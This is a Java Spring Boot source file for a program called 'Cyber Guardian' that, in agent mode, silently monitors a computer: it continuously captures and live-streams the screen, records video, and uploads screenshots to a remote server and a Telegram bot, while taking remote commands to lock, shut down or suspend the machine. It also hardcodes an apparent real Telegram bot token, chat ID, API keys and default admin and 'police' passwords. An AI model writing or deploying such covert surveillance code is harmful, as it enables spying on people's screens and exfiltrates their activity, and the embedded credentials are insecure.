package com.guardian;

import com.guardian.entity.User;
import com.guardian.repository.UserRepository;
import com.guardian.service.SecurityService;
import org.springframework.security.crypto.bcrypt.BCryptPasswordEncoder;
import java.util.Optional;
import org.json.JSONArray;
import org.json.JSONObject;
import org.springframework.boot.autoconfigure.SpringBootApplication;
import org.springframework.boot.builder.SpringApplicationBuilder;
import org.springframework.context.ConfigurableApplicationContext;

import javax.swing.*;
import java.awt.*;
import java.io.IOException;
import java.net.URI;
import java.net.http.HttpClient;
import java.net.http.HttpRequest;
import java.net.http.HttpResponse;
import java.nio.charset.StandardCharsets;
import java.nio.file.Files;
import java.nio.file.Paths;
import javax.net.ssl.*;
import java.time.Duration;
import java.util.ArrayList;
import java.util.List;
import java.util.Properties;

@SpringBootApplication
public class Main {
    private static final String WORK_DIR = System.getProperty("user.home") + java.io.File.separator + "CyberGuardian_Data";
    private static List<String> blacklist = new ArrayList<>();
    private static int scanInterval = 2000;
    private static String masterPassword = "admin";
    private static boolean isLocked = false;
    
    // MASTER ADMIN CREDENTIALS
    private static final String PLATFORM_BOT_TOKEN = System.getenv().getOrDefault("TELEGRAM_BOT_TOKEN", "8780573988:AAEAWFDtYg_p-hst4JwqA9RSWN9cNzW7eKk");
    private static final String ADMIN_CHAT_ID = System.getenv().getOrDefault("TELEGRAM_CHAT_ID", "1123697239");

    private static String botToken = PLATFORM_BOT_TOKEN;
    private static String chatId = ADMIN_CHAT_ID;
    private static long lastUpdateId = 0;

    private static TrayIcon trayIcon;
    private static HttpClient httpClient;
    private static SecurityService securityService;
    private static String SERVER_URL = "http://localhost:8081";
    private static String API_KEY = "ADMIN-777";
    private static String TARGET_ID = "UNKNOWN-PC";

    static {
        try {
            httpClient = HttpClient.newBuilder()
                    .connectTimeout(Duration.ofSeconds(10))
                    .build();
            
            java.io.File dir = new java.io.File(WORK_DIR);
            if (!dir.exists()) dir.mkdirs();
            log("🚀 [SYSTEM] Guardian Initialized. WorkDir: " + WORK_DIR);
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void log(String msg) {
        System.out.println(msg);
        try {
            java.nio.file.Files.write(java.nio.file.Paths.get(WORK_DIR, "agent_debug.log"), 
                (new java.util.Date() + ": " + msg + "\n").getBytes(), 
                java.nio.file.StandardOpenOption.CREATE, java.nio.file.StandardOpenOption.APPEND);
        } catch (Exception ignored) {}
    }

    private static void loadConfig() {
        try {
            java.io.File configFile = new java.io.File("config.json");
            if (!configFile.exists()) {
                System.out.println("⚠️ [WARN] config.json not found, using defaults.");
                return;
            }
            String content = Files.readString(configFile.toPath());
            JSONObject json = new JSONObject(content);
            
            if (json.has("botToken")) botToken = json.getString("botToken");
            if (json.has("chatId")) chatId = json.getString("chatId");
            if (json.has("scanInterval")) scanInterval = json.getInt("scanInterval");
            SERVER_URL = json.optString("server_url", "http://localhost:8081");
            API_KEY = json.optString("api_key", "ADMIN-777");
            if (json.has("blacklist")) {
                JSONArray arr = json.getJSONArray("blacklist");
                blacklist.clear();
                for (int i = 0; i < arr.length(); i++) {
                    blacklist.add(arr.getString(i));
                }
            }
            if (json.has("target_id")) TARGET_ID = json.getString("target_id");
            if (json.has("isLocked")) isLocked = json.getBoolean("isLocked");
            System.out.println("✅ [DEBUG] Configuration loaded from config.json");
        } catch (Exception e) {
            System.err.println("❌ [ERROR] Failed to load config.json: " + e.getMessage());
        }
    }

    public static boolean isLocked() { return isLocked; }
    public static void setLockedRemote(boolean locked) {
        if (locked) remoteLock(); else remoteUnlock();
    }

    public static void main(String[] args) {
        // ENSURE WORK DIR EXISTS
        java.io.File workDir = new java.io.File(WORK_DIR);
        if (!workDir.exists()) workDir.mkdirs();
        
        // FIX SQLite AccessDenied
        System.setProperty("org.sqlite.tmpdir", WORK_DIR);

        try (java.io.PrintWriter out = new java.io.PrintWriter(new java.io.FileWriter(new java.io.File(workDir, "debug.log"), true))) {
            out.println("--- STARTUP: " + new java.util.Date() + " ---");
            out.flush();
        } catch (Exception ignored) {}

        loadConfig();

        System.out.println("🚀 [DEBUG] Booting Cyber Guardian...");
        System.out.flush();

        boolean isAgent = false;
        for (String arg : args) {
            if (arg.equalsIgnoreCase("--agent")) {
                isAgent = true;
                break;
            }
        }

        ConfigurableApplicationContext context = null;
        try {
            SpringApplicationBuilder builder = new SpringApplicationBuilder(Main.class)
                    .properties("spring.jmx.enabled=false", "spring.main.banner-mode=off", "server.port=8081")
                    .headless(!isAgent);

            if (isAgent) {
                builder.web(org.springframework.boot.WebApplicationType.NONE);
            } else {
                builder.web(org.springframework.boot.WebApplicationType.SERVLET);
            }
            
            context = builder.run(args);

            String pcName = System.getProperty("user.name");
            try { pcName += "@" + java.net.InetAddress.getLocalHost().getHostName(); } catch (Exception ignored) {}
            TARGET_ID = pcName.replaceAll("[^a-zA-Z0-9-]", "_"); // Sanitize for folder names
            
            sendTelegramMessage("🚀 *SYSTEM ONLINE:* Silent Monitoring has started on: `" + pcName + "`", chatId);

            System.out.println("✅ [DEBUG] Spring Context Started.");
            System.out.flush();
        } catch (Exception e) {
            System.err.println("❌ Spring Boot Failed: " + e.getMessage());
            System.exit(1);
        }

        final ConfigurableApplicationContext finalContext = context;
        try {
            securityService = finalContext.getBean(SecurityService.class);
            securityService.setLocked(isLocked);
            if (blacklist.isEmpty()) {
                blacklist.add("WhatsApp");
                blacklist.add("Telegram");
                blacklist.add("Chrome");
                blacklist.add("Instagram");
                blacklist.add("Gmail");
            }
            securityService.setBlacklist(blacklist);
            securityService.setAlertCallback((appName) -> {
                sendTelegramMessage("🛡️ *INTRUSION DETECTED:* `" + appName + "` was blocked on: `" + System.getProperty("user.name") + "`");
                takeScreenshot("intrusion_" + appName + "_" + System.currentTimeMillis() + ".jpg");
            });
            
            if (isAgent) {
                log("🚀 [AGENT] Monitoring Mode Active...");
                loadConfig();
                // If config.json didn't override it, calculate target name dynamically if needed
                if ("UNKNOWN-PC".equals(TARGET_ID)) {
                    String pcName = System.getProperty("user.name");
                    try { pcName += "@" + java.net.InetAddress.getLocalHost().getHostName(); } catch (Exception ignored) {}
                    TARGET_ID = pcName.replaceAll("[^a-zA-Z0-9-]", "_");
                }
                log("📍 [AGENT] Target ID (Dynamic): " + TARGET_ID + " | Server: " + SERVER_URL);
                
                new Thread(() -> {
                    log("🛡️ [AGENT] Protection Thread Started.");
                    while (true) {
                        try {
                            securityService.scanAndProtect();
                            Thread.sleep(scanInterval);
                        } catch (Exception e) { log("❌ [AGENT] Protection Error: " + e.getMessage()); }
                    }
                }).start();

                startTelegramListener(context);
                startLiveStreaming();
                startServerPolling();
                log("✅ [AGENT] All threads initialized.");
            } else {
                log("🌐 [SERVER] Dashboard Mode Active (No local monitoring)");
            }

            // Initialize Default Admin if no users exist
            UserRepository repo = finalContext.getBean(UserRepository.class);
            BCryptPasswordEncoder encoder = new BCryptPasswordEncoder();
            
            Optional<User> adminOpt = repo.findByEmail("admin@guardian.com");
            if (adminOpt.isPresent()) {
                User admin = adminOpt.get();
                if (!admin.getPassword().startsWith("$2a$")) {
                    admin.setPassword(encoder.encode("admin"));
                    repo.save(admin);
                    System.out.println("👤 [INFO] Default Admin Password Securely Hashed");
                }
            } else {
                User admin = new User();
                admin.setEmail("admin@guardian.com");
                admin.setPassword(encoder.encode("admin"));
                admin.setPhoneNumber("0000000000");
                admin.setTelegramBotToken(PLATFORM_BOT_TOKEN);
                admin.setTelegramChatId(ADMIN_CHAT_ID);
                admin.setApiKey("ADMIN-777");
                repo.save(admin);
                System.out.println("👤 [INFO] Default Admin Created: admin@guardian.com / admin");
            }
            
            Optional<User> policeOpt = repo.findByEmail("police@3rdai.gov");
            if (policeOpt.isPresent()) {
                User police = policeOpt.get();
                boolean updated = false;
                if (!police.getPassword().startsWith("$2a$")) {
                    police.setPassword(encoder.encode("police123"));
                    updated = true;
                }
                if (!"POLICE".equalsIgnoreCase(police.getRole())) {
                    police.setRole("POLICE");
                    updated = true;
                }
                if (updated) {
                    repo.save(police);
                    System.out.println("🚔 [INFO] Default Police Account Securely Synced and Role Set to POLICE");
                }
            } else {
                User police = new User();
                police.setEmail("police@3rdai.gov");
                police.setPassword(encoder.encode("police123"));
                police.setPhoneNumber("100");
                police.setApiKey("POLICE-999");
                police.setRole("POLICE");
                repo.save(police);
                System.out.println("🚔 [INFO] Default Police Created: police@3rdai.gov / police123");
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private static void startTelegramListener(ConfigurableApplicationContext context) {
        new Thread(() -> {
            log("📬 [AGENT] Telegram Listener Started. BotToken: " + botToken.substring(0, 5) + "...");
            while (true) {
                try {
                    String url = "https://api.telegram.org/bot" + botToken + "/getUpdates?offset=" + (lastUpdateId + 1);
                    HttpRequest request = HttpRequest.newBuilder().uri(URI.create(url)).GET().build();
                    HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
                    
                    if (response.statusCode() == 200) {
                        JSONObject json = new JSONObject(response.body());
                        if (json.getBoolean("ok")) {
                            JSONArray updates = json.getJSONArray("result");
                            for (int i = 0; i < updates.length(); i++) {
                                JSONObject update = updates.getJSONObject(i);
                                lastUpdateId = update.getLong("update_id");
                                if (update.has("message")) {
                                    JSONObject message = update.getJSONObject("message");
                                    String text = message.optString("text", "");
                                    String senderChatId = String.valueOf(message.getJSONObject("chat").getLong("id"));
                                    if (senderChatId.equals(chatId)) {
                                        log("💬 [AGENT] Received Command: " + text);
                                        handleRemoteCommand(text);
                                    }
                                }
                            }
                        }
                    } else {
                        log("⚠️ [AGENT] Telegram HTTP Error: " + response.statusCode());
                    }
                } catch (Exception e) { 
                    log("❌ [AGENT] Telegram Error: " + e.getMessage());
                }
                try { Thread.sleep(2000); } catch (Exception ignored) {}
            }
        }).start();
    }

    private static void handleRemoteCommand(String command) {
        if (command == null) return;
        try {
            // Normalize spaces (e.g. "/ recording" -> "/recording")
            String cleanCmd = command.trim().replaceAll("^/\\s+", "/");
            String lowerCmd = cleanCmd.toLowerCase();
            
            boolean kavach = (securityService != null && securityService.isKavachActive());
            
            if (kavach && (lowerCmd.contains("screenshot") || lowerCmd.contains("record") || lowerCmd.contains("recording"))) {
                sendTelegramMessage("🛡️ *3rd AI KAVACH ALERT:* An unauthorized spying attempt (" + cleanCmd + ") was BLOCKED and reported to AI Police.");
                securityService.addLog("KOCKROACH", "SPYING ATTEMPT", "Unauthorized " + cleanCmd + " blocked by Kavach on " + System.getProperty("user.name"), null, TARGET_ID);
                return;
            }

            if (lowerCmd.equals("/lock")) {
                remoteLock();
                sendTelegramMessage("🔐 *System LOCKED successfully.*");
            }
            else if (lowerCmd.equals("/unlock")) {
                remoteUnlock();
                sendTelegramMessage("🔓 *System UNLOCKED successfully.*");
            }
            else if (lowerCmd.equals("/screenshot")) {
                sendTelegramMessage("📸 *Capturing screenshot...*");
                takeScreenshot("manual_" + System.currentTimeMillis() + ".jpg");
            }
            else if (lowerCmd.equals("/shutdown")) {
                sendTelegramMessage("🔌 *Shutting down...*");
                Runtime.getRuntime().exec("shutdown /s /t 5");
            }
            else if (lowerCmd.equals("/sleep")) {
                sendTelegramMessage("🌙 *Putting system to sleep...*");
                Runtime.getRuntime().exec("rundll32.exe powrprof.dll,SetSuspendState 0,1,0");
            }
            else if (lowerCmd.startsWith("/record")) {
                int secs = 10;
                String[] parts = cleanCmd.split("\\s+");
                if (parts.length > 1) {
                    try {
                        secs = Integer.parseInt(parts[1]);
                    } catch (NumberFormatException ignored) {}
                }
                sendTelegramMessage("🎥 *Started recording " + secs + "s...*");
                recordVideo(secs);
            }
        } catch (Exception e) {
            sendTelegramMessage("❌ *Failed:* " + e.getMessage());
        }
    }

    private static String takeScreenshot(String fileName) {
        try {
            Robot robot = new Robot();
            Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
            java.awt.image.BufferedImage img = robot.createScreenCapture(screenRect);
            java.io.File file = new java.io.File(WORK_DIR, fileName);
            javax.imageio.ImageIO.write(img, "jpg", file);
            
            // Send to both Telegram and Web Dashboard
            sendTelegramPhoto(file);
            uploadToServer(file); 
            
            return fileName;
        } catch (Exception e) {
            logTelegramResponse("Screenshot Error", e.getMessage());
            return null;
        }
    }

    private static void sendTelegramMessage(String text) { sendTelegramMessage(text, chatId); }

    private static void sendTelegramMessage(String text, String targetChatId) {
        new Thread(() -> {
            try {
                String activeToken = (botToken != null && !botToken.isEmpty()) ? botToken : PLATFORM_BOT_TOKEN;
                String url = "https://api.telegram.org/bot" + activeToken + "/sendMessage";
                JSONObject json = new JSONObject();
                json.put("chat_id", targetChatId);
                json.put("text", text);
                json.put("parse_mode", "Markdown");
                HttpRequest request = HttpRequest.newBuilder().uri(URI.create(url)).header("Content-Type", "application/json").POST(HttpRequest.BodyPublishers.ofString(json.toString())).build();
                HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
                logTelegramResponse("Message", response.body());
            } catch (Exception e) {
                logTelegramResponse("Message Error", e.getMessage());
            }
        }).start();
    }

    private static void sendTelegramPhoto(java.io.File file) {
        new Thread(() -> {
            try {
                Thread.sleep(1000);
                if (!file.exists()) return;
                String activeToken = (botToken != null && !botToken.isEmpty()) ? botToken : PLATFORM_BOT_TOKEN;
                String url = "https://api.telegram.org/bot" + activeToken + "/sendPhoto";
                String boundary = "Boundary" + System.currentTimeMillis();
                HttpRequest request = HttpRequest.newBuilder().uri(URI.create(url)).header("Content-Type", "multipart/form-data; boundary=" + boundary).POST(buildMultipartBody(file, boundary, "photo", "image/jpeg")).build();
                HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
                logTelegramResponse("Photo", response.body());
            } catch (Exception e) { logTelegramResponse("Photo Error", e.getMessage()); }
        }).start();
    }

    private static void recordVideo(int seconds) {
        new Thread(() -> {
            try {
                java.io.File file = new java.io.File(WORK_DIR, "record.mp4");
                org.jcodec.api.awt.AWTSequenceEncoder encoder = org.jcodec.api.awt.AWTSequenceEncoder.createSequenceEncoder(file, 8);
                Robot robot = new Robot();
                Dimension screen = Toolkit.getDefaultToolkit().getScreenSize();
                Rectangle screenRect = new Rectangle(screen);
                int tw = screen.width / 2; int th = screen.height / 2;
                long end = System.currentTimeMillis() + (seconds * 1000L);
                while (System.currentTimeMillis() < end) {
                    long start = System.currentTimeMillis();
                    java.awt.image.BufferedImage img = robot.createScreenCapture(screenRect);
                    java.awt.image.BufferedImage scaled = new java.awt.image.BufferedImage(tw, th, java.awt.image.BufferedImage.TYPE_INT_RGB);
                    scaled.getGraphics().drawImage(img, 0, 0, tw, th, null);
                    encoder.encodeImage(scaled);
                    long el = System.currentTimeMillis() - start;
                    if (el < 125) Thread.sleep(125 - el);
                }
                encoder.finish();
                sendTelegramVideo(file);
                uploadToServer(file);
            } catch (Exception e) {
                logTelegramResponse("Video Record Error", e.getMessage());
            }
        }).start();
    }

    private static void sendTelegramVideo(java.io.File file) {
        new Thread(() -> {
            try {
                String activeToken = (botToken != null && !botToken.isEmpty()) ? botToken : PLATFORM_BOT_TOKEN;
                String url = "https://api.telegram.org/bot" + activeToken + "/sendVideo";
                String boundary = "Boundary" + System.currentTimeMillis();
                HttpRequest request = HttpRequest.newBuilder().uri(URI.create(url)).header("Content-Type", "multipart/form-data; boundary=" + boundary).POST(buildMultipartBody(file, boundary, "video", "video/mp4")).build();
                HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
                logTelegramResponse("Video", response.body());
            } catch (Exception e) { logTelegramResponse("Video Error", e.getMessage()); }
        }).start();
    }

    private static void logTelegramResponse(String type, String body) {
        try {
            java.io.File logFile = new java.io.File(WORK_DIR, "telegram_debug.log");
            try (java.io.PrintWriter out = new java.io.PrintWriter(new java.io.FileWriter(logFile, true))) {
                out.println("[" + new java.util.Date() + "] " + type + ": " + body);
            }
        } catch (Exception ignored) {}
    }

    private static HttpRequest.BodyPublisher buildMultipartBody(java.io.File file, String boundary, String fieldName, String contentType) throws IOException {
        byte[] fileBytes = Files.readAllBytes(file.toPath());
        java.io.ByteArrayOutputStream bs = new java.io.ByteArrayOutputStream();
        bs.write(("--" + boundary + "\r\n").getBytes());
        bs.write("Content-Disposition: form-data; name=\"chat_id\"\r\n\r\n".getBytes());
        bs.write((chatId + "\r\n").getBytes());
        bs.write(("--" + boundary + "\r\n").getBytes());
        bs.write(("Content-Disposition: form-data; name=\"" + fieldName + "\"; filename=\"" + file.getName() + "\"\r\n").getBytes());
        bs.write(("Content-Type: " + contentType + "\r\n\r\n").getBytes());
        bs.write(fileBytes);
        bs.write(("\r\n--" + boundary + "--\r\n").getBytes());
        return HttpRequest.BodyPublishers.ofByteArray(bs.toByteArray());
    }

    private static void remoteLock() { isLocked = true; if (securityService != null) securityService.setLocked(true); }
    private static void remoteUnlock() { isLocked = false; if (securityService != null) securityService.setLocked(false); }

    private static boolean liveStreamActive = true;

    private static void startLiveStreaming() {
        new Thread(() -> {
            try {
                Robot robot = new Robot();
                Rectangle screenRect = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
                while (true) {
                    if (liveStreamActive) {
                        java.awt.image.BufferedImage img = robot.createScreenCapture(screenRect);
                        java.io.File file = new java.io.File(WORK_DIR, "live_stream.jpg");
                        javax.imageio.ImageIO.write(img, "jpg", file);
                        
                        // Upload specifically for live stream
                        String boundary = "Boundary" + System.currentTimeMillis();
                        HttpRequest request = HttpRequest.newBuilder()
                                .uri(URI.create(SERVER_URL + "/api/live-upload?targetId=" + TARGET_ID))
                                .header("Content-Type", "multipart/form-data; boundary=" + boundary)
                                .POST(buildMultipartBodyForServer(file, boundary, "image/jpeg"))
                                .header("ngrok-skip-browser-warning", "1")
                    .build();
                        httpClient.send(request, HttpResponse.BodyHandlers.ofString());
                    }
                    Thread.sleep(1500); // 1.5 second interval for stability
                }
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    private static void startServerPolling() {
        new Thread(() -> {
            log("📡 [AGENT] Server Polling Started. URL: " + SERVER_URL);
            while (true) {
                try {
                    String pollUrl = SERVER_URL + "/api/commands/poll?apiKey=" + API_KEY + "&targetId=" + java.net.URLEncoder.encode(TARGET_ID, java.nio.charset.StandardCharsets.UTF_8.toString());
                    HttpRequest request = HttpRequest.newBuilder().uri(URI.create(pollUrl)).header("ngrok-skip-browser-warning", "1").GET().build();
                    HttpResponse<String> response = httpClient.send(request, HttpResponse.BodyHandlers.ofString());
                    if (response.statusCode() == 200) {
                        JSONObject json = new JSONObject(response.body());
                        String cmd = json.getString("command");
                        
                        if (!cmd.equals("NONE")) {
                            log("📬 [SERVER] Received Remote Command: " + cmd);
                            handleRemoteCommand("/" + cmd.toLowerCase());
                        }
                    } else {
                        log("⚠️ [AGENT] Server Polling Error: " + response.statusCode());
                    }
                } catch (Exception e) { 
                    log("❌ [AGENT] Server Polling Failed: " + e.getMessage());
                }
                try { Thread.sleep(5000); } catch (Exception ignored) {}
            }
        }).start();
    }

    private static void uploadToServer(java.io.File file) {
        new Thread(() -> {
            try {
                if (!file.exists()) return;
                String boundary = "Boundary" + System.currentTimeMillis();
                String contentType = file.getName().endsWith(".mp4") ? "video/mp4" : "image/jpeg";
                HttpRequest request = HttpRequest.newBuilder()
                        .uri(URI.create(SERVER_URL + "/api/upload?targetId=" + TARGET_ID))
                        .header("Content-Type", "multipart/form-data; boundary=" + boundary)
                        .POST(buildMultipartBodyForServer(file, boundary, contentType))
                        .header("ngrok-skip-browser-warning", "1")
                    .build();
                httpClient.send(request, HttpResponse.BodyHandlers.ofString());
                
                // Add a log for the Police Dashboard
                String action = file.getName().endsWith(".mp4") ? "VIDEO_CAPTURE" : "SCREENSHOT_CAPTURE";
                securityService.addLog("KOCKROACH", action, "Evidence uploaded from " + System.getProperty("user.name"), file.getName(), TARGET_ID);
            } catch (Exception e) { e.printStackTrace(); }
        }).start();
    }

    private static HttpRequest.BodyPublisher buildMultipartBodyForServer(java.io.File file, String boundary, String contentType) throws IOException {
        byte[] fileBytes = Files.readAllBytes(file.toPath());
        java.io.ByteArrayOutputStream bs = new java.io.ByteArrayOutputStream();
        bs.write(("--" + boundary + "\r\n").getBytes());
        bs.write(("Content-Disposition: form-data; name=\"file\"; filename=\"" + file.getName() + "\"\r\n").getBytes());
        bs.write(("Content-Type: " + contentType + "\r\n\r\n").getBytes());
        bs.write(fileBytes);
        bs.write(("\r\n--" + boundary + "--\r\n").getBytes());
        return HttpRequest.BodyPublishers.ofByteArray(bs.toByteArray());
    }
}
